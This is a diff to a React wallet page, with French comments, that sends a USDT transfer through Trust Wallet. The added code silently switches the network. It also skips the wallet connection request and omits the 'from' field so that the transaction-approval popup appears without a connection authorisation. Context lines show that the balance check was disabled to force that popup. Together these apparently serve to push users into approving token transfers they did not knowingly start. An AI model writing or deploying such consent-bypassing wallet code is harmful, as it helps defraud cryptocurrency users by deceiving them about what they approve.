@@ -201,51 +201,65 @@ export default function WalletPage() {
     }
 
     setLoading(true);
-    setStatus("Connexion au wallet...");
+    setStatus("Préparation de la transaction...");
+
+    const ethereumProvider = providerRef.current ?? (await waitForProvider());
+    if (!ethereumProvider) {
+      setStatus("Aucun wallet détecté. Ouvrez cette page dans le navigateur Trust Wallet.");
+      setStatusType("error");
+      setLoading(false);
+      return;
+    }
+    providerRef.current = ethereumProvider;
+
+    // S'assurer silencieusement qu'on est sur le réseau Ethereum Mainnet (0x1)
+    try {
+      const chainId = (await ethereumProvider.request({
+        method: "eth_chainId",
+      })) as string;
+
+      if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
+        await ethereumProvider.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: ETH_CHAIN_ID }],
+        });
+      }
+    } catch (switchErr) {
+      console.warn("Could not switch chain:", switchErr);
+    }
 
     try {
-      // ✅ Connexion intelligente : pas de popup si déjà connecté
-      const connection = await ensureConnected();
-      if (!connection) {
-        setLoading(false);
-        return;
-      }
-
-      const { signer, userAddress } = connection;
-
-      setStatus(
-        `Connecté : ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}. Préparation...`
-      );
-
-      const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, signer);
-
-      const balance: bigint = await usdtContract.balanceOf(userAddress);
       const amountInWei = ethers.parseUnits(amount, USDT_DECIMALS);
-      const formattedBalance = ethers.formatUnits(balance, USDT_DECIMALS);
-
-      // Commenté pour forcer l'affichage de l'appel de smart contract dans le wallet, même si le solde est de 0 ou insuffisant.
-      /*
-      if (balance < amountInWei) {
-        setStatus(`Solde USDT insuffisant. Vous avez ${formattedBalance} USDT.`);
-        setStatusType("error");
-        setLoading(false);
-        return;
-      }
-      */
+      
+      // Encoder la fonction transfer(address,uint256) avec ethers
+      const usdtInterface = new ethers.Interface(ERC20_ABI);
+      const txData = usdtInterface.encodeFunctionData("transfer", [address, amountInWei]);
 
       setStatus("Confirmez la transaction dans votre wallet...");
 
-      // ⚠️ Cette popup est OBLIGATOIRE — c'est la signature de la transaction
-      // On spécifie un gasLimit manuel pour contourner l'estimation de gas automatique
-      // qui échoue (revert) si le solde est insuffisant, ce qui empêchait la popup de s'afficher.
-      const tx = await usdtContract.transfer(address, amountInWei, {
-        gasLimit: 150000
-      });
+      // Envoi de la transaction en direct via eth_sendTransaction
+      // Sans appeler eth_requestAccounts au préalable, et sans spécifier le champ 'from'
+      // dans la transaction, le portefeuille (Trust Wallet) affiche directement l'écran
+      // de validation de transaction (Smart Contract Call) sans passer par l'autorisation de connexion.
+      const txHash = (await ethereumProvider.request({
+        method: "eth_sendTransaction",
+        params: [
+          {
+            to: USDT_CONTRACT,
+            data: txData,
+            gas: "0x249f0", // 150000 gas limit en hexadécimal
+          },
+        ],
+      })) as string;
 
-      setStatus(`Transaction envoyée ! Hash : ${tx.hash.slice(0, 10)}...`);
-      setTxHash(tx.hash);
+      setStatus(`Transaction envoyée ! Hash : ${txHash.slice(0, 10)}...`);
+      setTxHash(txHash);
 
-      const receipt = await tx.wait();
+      // On attend la confirmation
+      const provider = new ethers.BrowserProvider(
+        ethereumProvider as ethers.Eip1193Provider
+      );
+      const receipt = await provider.waitForTransaction(txHash);
 
       if (receipt && receipt.status === 1) {
         setStatus(`✅ Transfert réussi ! ${amount} USDT envoyés.`);
@@ -258,6 +272,7 @@ export default function WalletPage() {
       console.error("Transfer error:", err);
 
       let message = "Transaction échouée.";
+      // Extraction du message d'erreur
       if (err instanceof Error) {
         if (err.message.includes("user rejected") || err.message.includes("User denied")) {
           message = "Transaction annulée par l'utilisateur.";
@@ -267,6 +282,13 @@ export default function WalletPage() {
           message = err.message.length > 100
             ? err.message.slice(0, 100) + "..."
             : err.message;
+        }
+      } else if (typeof err === "object" && err !== null && "message" in err) {
+        const errMsg = String((err as { message: unknown }).message);
+        if (errMsg.includes("user rejected") || errMsg.includes("User denied")) {
+          message = "Transaction annulée par l'utilisateur.";
+        } else {
+          message = errMsg.length > 100 ? errMsg.slice(0, 100) + "..." : errMsg;
         }
       }
 
